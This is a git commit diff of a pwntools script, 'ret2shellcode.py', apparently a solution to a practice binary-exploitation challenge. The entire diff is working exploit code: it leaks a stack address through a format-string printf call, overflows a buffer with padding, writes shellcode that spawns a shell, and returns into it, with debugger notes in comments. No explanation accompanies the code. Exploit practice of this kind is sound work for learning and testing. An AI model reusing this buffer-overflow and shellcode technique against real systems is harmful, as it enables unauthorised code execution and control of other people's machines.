e864a743a6fa9646de6b229ed6326537788c489c
Michael-c0de <1679556937@qq.com>
2024-11-10 01:16:55 -0800

    ret2shellcode

--- ret2shellcode.py
+++ ret2shellcode.py
@@ -1,9 +1,27 @@
 from pwn import *
 context.arch="i386"
 p = process("./ret2shellcode")
+buf2 = 0x804A080
+printf = 0x80483C0
+main = p.elf.sym['main']
+payload = b"%2$p"
+payload = payload.ljust(0x70, b"\x00")
+
+
+p.sendline(payload + p32(printf)+p32(main) + p32(buf2))
+p.recvuntil(b"bye bye ~")
+leak = int(p.recvuntil(b"No system for",drop=True), 16)
+shellcode = leak - 0x88
+
 payload = asm(shellcraft.sh())
-payload = payload.ljust(0x70, b"a")
-p.sendline(payload + p32(0xffffd67c))
+payload = payload.ljust(0x68, b"\x00")
+
+p.sendline(payload + p32(shellcode))
 p.interactive()
 
-# b *0x80485c6
+# b *0x80485C0
+
+# gef➤  p $esp
+# $1 = (void *) 0xffe35420
+# gef➤  p $ebp
+# $2 = (void *) 0xffe354a0
